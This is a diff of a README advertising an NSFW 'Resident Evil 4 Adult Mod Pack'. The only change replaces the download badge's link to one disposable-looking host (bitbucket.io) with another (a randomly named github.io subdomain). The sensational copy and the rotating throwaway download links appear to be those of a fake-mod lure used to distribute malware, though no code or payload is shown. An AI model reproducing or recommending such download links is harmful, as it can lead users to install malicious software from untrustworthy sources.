@@ -4,7 +4,7 @@
 
 Leon’s back in the parasite nightmare, but this time the real shock isn’t a Ganado with a chainsaw – it’s Ashley in lingerie, Ada in latex and a photo-mode that lets you orbit every curve. The **Resident Evil 4 Adult Mod Pack** blows the church doors wide open with 4K nude textures, physics enhancements, lewd props and a fly-cam mapped to a single hotkey. If you thought the remake already pushed the M rating, buckle up – we’re going full NSFW survival-horror. 💋🔫
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload9.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Resident-Evil-4-Adult-Mod-lu8.github.io/.github)
 ---
 
 ## Product Description
